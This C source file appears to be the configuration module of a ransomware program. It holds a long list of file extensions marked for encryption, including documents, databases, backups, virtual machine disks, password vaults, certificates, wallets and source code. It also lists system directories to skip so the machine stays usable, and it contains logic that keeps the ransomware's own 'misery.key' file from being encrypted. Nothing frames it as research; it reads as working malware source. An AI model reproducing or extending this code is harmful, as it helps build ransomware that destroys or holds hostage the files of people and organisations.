
// config.c 

#include "fops_internal.h"
#include "fops_log.h"
#include <shlwapi.h> // Required for StrStrIA
#include <string.h>

// Directories to skip during traversal
const char *g_fops_skip_dirs[] = {
    "\\Windows", "\\System32", "\\SysWOW64", "\\Program Files", "\\Program Files (x86)",
    "\\AppData", "\\$Recycle.Bin", "\\Boot", "\\ProgramData\\Microsoft",
    "\\.venv", "\\node_modules", NULL
};

// Target extensions for encryption
static const char *g_fops_target_exts[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",".pdf",
    ".txt",".rtf",".csv",".tsv",".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso",".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",".env",".gitconfig",".gitignore",".ovpn", NULL
};

bool FopsIsKeyFilePath(const char *path) {
    if (!path || !*path) return false;
    static const char *exactPaths[] = { "C:\\Users\\jahan\\OneDrive\\Desktop\\misery.key", NULL };
    for (int i = 0; exactPaths[i]; i++) {
        if (_stricmp(path, exactPaths[i]) == 0) return true;
    }
    size_t len = strlen(path);
    if (_stricmp(path, "misery.key") == 0) return true;
    if (len >= 12) {
        if ((path[len - 11] == '\\' || path[len - 11] == '/') && _stricmp(path + len - 10, "misery.key") == 0)
            return true;
    }
    return false;
}

bool FopsIsTargetExtension(const char *path) {
    if (!path) return false;
    if (FopsIsKeyFilePath(path)) return false;
    const char *dot = strrchr(path, '.');
    if (!dot) return false;
    for (int i = 0; g_fops_target_exts[i]; i++) {
        if (_stricmp(dot, g_fops_target_exts[i]) == 0) return true;
    }
    return false;
}

bool FopsDefaultShouldSkip(const WCHAR *path) {
    char narrow[FILEOPS_MAX_PATH];
    if (!WideCharToMultiByte(CP_UTF8, 0, path, -1, narrow, sizeof(narrow), NULL, NULL))
        return false;
    // FIX: Use StrStrIA for case-insensitive comparison to prevent skipping failures on Windows
    for (int i = 0; g_fops_skip_dirs[i]; i++) {
        if (StrStrIA(narrow, g_fops_skip_dirs[i]) != NULL) return true;
    }
    return false;
}
